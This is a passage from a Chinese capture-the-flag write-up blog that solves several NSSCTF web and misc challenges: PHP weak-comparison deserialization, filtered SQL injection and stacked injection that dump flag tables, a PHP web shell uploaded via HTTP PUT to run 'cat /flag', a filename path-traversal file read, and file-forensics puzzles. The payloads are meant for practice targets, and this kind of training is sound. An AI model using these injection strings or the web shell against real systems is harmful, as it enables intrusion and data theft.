class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-comment">//here I changed those two </span><br><span class="hljs-variable">$info</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;info&#x27;</span>])? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;info&#x27;</span>]: <span class="hljs-string">&quot;&quot;</span> ;<br><span class="hljs-variable">$data_unserialize</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$info</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-variable">$username</span>&amp;&amp;<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-variable">$password</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error!&quot;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>username和password都会被修改成不知道的值，所以不可能给他们赋上真实的值</p><p>这里用<code>==</code>是弱比较</p><p>并且用了反序列化</p><p>因此，构造info如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$info</span>=<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-literal">true</span><br>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$info</span>));<br><span class="hljs-comment">#a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为上面用的是键名访问，所以这里要用数组</p><p>简单介绍弱类型比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;a&quot;</span>==<span class="hljs-literal">true</span>)  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;a&quot;</span>==<span class="hljs-literal">false</span>)  <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-meta">?&gt;</span>  <br><br></code></pre></td></tr></table></figure><p><code>NSSCTF&#123;881620fb-c01a-4eda-bbfa-baef4a333f9e&#125;</code></p><h3 id="swpuctf-2021-新生赛sql"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛sql"></a> [SWPUCTF 2021 新生赛]sql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">过滤注释符，用%23替代<br>过滤空格，用/**/替代<br>?wllm=1&#x27;/**/order/**/by/**/3%23   #3列<br>?wllm=0&#x27;/**/union/**/select/**/1,2,database()%23   #test_db<br>过滤等号,用like替代<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23 #LTLT_flag,users<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&#x27;LTLT_flag&#x27;%23  #id,flag<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(flag)/**/from/**/LTLT_flag%23   #NSSCTF&#123;b0c390d7-ca62<br>group_concat只回显20个字符，使用right,REVERSE,substr被过滤，使用mid替代<br>?wllm=0&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),21,20)/**/from/**/LTLT_flag%23 #-4071-9468-bb0808163<br>?wllm=0&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),41,20)/**/from/**/LTLT_flag%23  #493&#125;<br></code></pre></td></tr></table></figure><p><code>NSSCTF&#123;b0c390d7-ca62-4071-9468-bb0808163493&#125;</code></p><h3 id="强网杯-2019随便注"><a class="markdownIt-Anchor" href="#强网杯-2019随便注"></a> [强网杯 2019]随便注</h3><p>这道是mysql堆叠注入</p><p>payload如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;;show tables;&#x27;得到两个表：<span class="hljs-number">1919810931114514</span> words<br><span class="hljs-attribute">1</span>&#x27;;show columns from `<span class="hljs-number">1919810931114514</span>`;&#x27;得到字段名为flag<br><span class="hljs-attribute">1</span>&#x27;;handler `<span class="hljs-number">1919810931114514</span>` open;handler `<span class="hljs-number">1919810931114514</span>` read first;&#x27;读出flag:NSSCTF&#123;<span class="hljs-number">2</span>cc5ca69-<span class="hljs-number">9</span>cec-<span class="hljs-number">4</span>a31-<span class="hljs-number">8</span>cb4-ee8748c8b51f&#125;<br></code></pre></td></tr></table></figure><h3 id="nssround1-basicbasic_check"><a class="markdownIt-Anchor" href="#nssround1-basicbasic_check"></a> [NSSRound#1 Basic]basic_check</h3><p>看到时有关HTTP，查看请求头都没看到什么，扫描也没有什么提示</p><p>用curl命令扫一下</p><img src="/2023/01/04/NSSCTFwp/5.jpg" class=""><p>现有请求方法可以用PUT，直接写入木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2023/01/04/NSSCTFwp/6.png" class=""><p>访问1.php，传参</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span> /</span><br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span> /flag</span><br><span class="hljs-comment">#NSSCTF&#123;01dfc03a-f0f6-419d-a992-32dd79ea301d&#125;</span><br></code></pre></td></tr></table></figure><h3 id="nisactf-2022babyupload"><a class="markdownIt-Anchor" href="#nisactf-2022babyupload"></a> [NISACTF 2022]babyupload</h3><p>看到文件上传</p><p>先看一下页面源码，是否有什么提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/upload&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    Select image to upload:<br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Upload File&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-comment">&lt;!-- /source --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不错，访问 /source下载到一个python文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, g, send_from_directory<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> uuid<br><br>app = Flask(__name__)<br><br>SCHEMA = <span class="hljs-string">&quot;&quot;&quot;CREATE TABLE files (</span><br><span class="hljs-string">id text primary key,</span><br><span class="hljs-string">path text</span><br><span class="hljs-string">);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    g_db = <span class="hljs-built_in">getattr</span>(g, <span class="hljs-string">&#x27;_database&#x27;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">if</span> g_db <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        g_db = g._database = sqlite3.connect(<span class="hljs-string">&quot;database.db&quot;</span>)<br>    <span class="hljs-keyword">return</span> g_db<br><br><br><span class="hljs-meta">@app.before_first_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>():<br>    os.remove(<span class="hljs-string">&quot;database.db&quot;</span>)<br>    cur = db().cursor()<br>    cur.executescript(SCHEMA)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">    Select image to upload:</span><br><span class="hljs-string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;!-- /source --&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;&quot;&quot;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/source&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">return</span> send_from_directory(directory=<span class="hljs-string">&quot;/var/www/html/&quot;</span>, path=<span class="hljs-string">&quot;www.zip&quot;</span>, as_attachment=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-keyword">in</span> file.filename:<span class="hljs-comment">#文件名不能有点，也就是不能有后缀</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad filename!&quot;</span>, <span class="hljs-number">403</span><br>    conn = db()<br>    cur = conn.cursor()<br>    uid = uuid.uuid4().<span class="hljs-built_in">hex</span>  <span class="hljs-comment">#生成一个UID号</span><br>    <span class="hljs-keyword">try</span>:<span class="hljs-comment">#将uid号和文件名放入数据库</span><br>        cur.execute(<span class="hljs-string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))<br>    <span class="hljs-keyword">except</span> sqlite3.IntegrityError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Duplicate file&quot;</span><br>    conn.commit()<br><br>    file.save(<span class="hljs-string">&#x27;uploads/&#x27;</span> + file.filename)    <span class="hljs-comment">#文件保存路径</span><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/file/&#x27;</span> + uid)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    conn = db()<br>    cur = conn.cursor()<br>    cur.execute(<span class="hljs-string">&quot;select path from files where id=?&quot;</span>, (<span class="hljs-built_in">id</span>,))<br><span class="hljs-comment">#通过uid号对应的文件名来作为路径访问</span><br>    res = cur.fetchone()  <span class="hljs-comment">#放回文件路径</span><br>    <span class="hljs-keyword">if</span> res <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;File not found&quot;</span>, <span class="hljs-number">404</span>    <br><br>    <span class="hljs-comment"># print(res[0])</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&quot;uploads/&quot;</span>, res[<span class="hljs-number">0</span>]), <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<span class="hljs-comment">#读取文件</span><br>        <span class="hljs-keyword">return</span> f.read()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>审计一下</p><p>上传的文件文件没有后缀，必定不会解析，看到后面也发现是利用文件名来实现文件读取</p><p>整体逻辑：上传一个文件，获取一个文件的UID号，将UID号和作为字段名，文件名作为字段值存储到数据库中，文件保存路径为<code>'uploads/' + file.filename</code>,通过UID号访问获得文件名，从而访问<code>'uploads/' + file.filename</code>.</p><p>所以这里的文件名可以使用系统中已有的文件路径，从而导致文件读取</p><img src="/2023/01/04/NSSCTFwp/7.png" class=""><p>直接访问/file/uid就可以得到flag<code>NSSCTF&#123;b56d535f-18b5-4446-9014-e33ad2496b8e&#125;</code></p><h3 id="swpu-2019神奇的二维码"><a class="markdownIt-Anchor" href="#swpu-2019神奇的二维码"></a> [SWPU 2019]神奇的二维码</h3><p>附件是一张二维码</p><img src="/2023/01/04/NSSCTFwp/MISC-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81-BitcoinPay.png" class=""><p>扫描后swpuctf{flag_is_not_here}是假的flag</p><p>放到虚拟机binwalk一下</p><img src="/2023/01/04/NSSCTFwp/binwalk.png" class=""><p>发现有很多压缩包</p><p><code>binwalk -e MISC-神奇的二维码-BitcoinPay.png</code>分解出来</p><p>里面有一个flag.doc是一堆base64编码</p><p>通过20次base64解码</p><p>得到<code>comEON_YOuAreSOSoS0great</code>,这是打开18394.rar里面音频的密码</p><p>音频打开后是一段莫斯密码</p><p>用Au打开，手动解码</p><img src="/2023/01/04/NSSCTFwp/morse.png" class=""><p>长的为<code>-</code>，短的为<code>.</code>，空的用<code>/</code>分隔</p><p>得到<code>--/---/.-./..././../.../...-/./.-./-.--/...-/./.-./-.--/./.-/.../-.--/</code></p><p>在线解码得到<code>MORSEISVERYVERYEASY</code>,用Python<code>&quot;MORSEISVERYVERYEASY&quot;.lower()</code>转小写</p><p><code>NSSCTF&#123;morseisveryveryeasy&#125;</code></p><h3 id="swpu-2020套娃"><a class="markdownIt-Anchor" href="#swpu-2020套娃"></a> [SWPU 2020]套娃</h3><p>附件下下来，得到打不开的swpu.xlsx和RC4data.txt</p><p>Office文件的本质都是一个zip压缩包</p><p>改后缀为zip,打开swpu.zip</p><p>又得到两个.xlsx文件：RC4key.xlsx,esayrc4.xlsx</p><p>都改为zip，发现只有RC4key.zip可以打开，esayrc4.zip打不开</p><p>RC4key.zip打开为一个加密的RC4key.txt</p><p>将esayrc4.xlsx放到WinHex里面在最下面发现密码<code>password:6e4c834d77cba03af41e1562a5bce84e</code>,</p><p>解压RC4key.zip得到<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code>,</p><p>结合RC4data.txt 在线RC4解密得到ef1a73d40977a49b99b871980f355757</p><p><code>NSSCTF&#123;ef1a73d40977a49b99b871980f355757&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
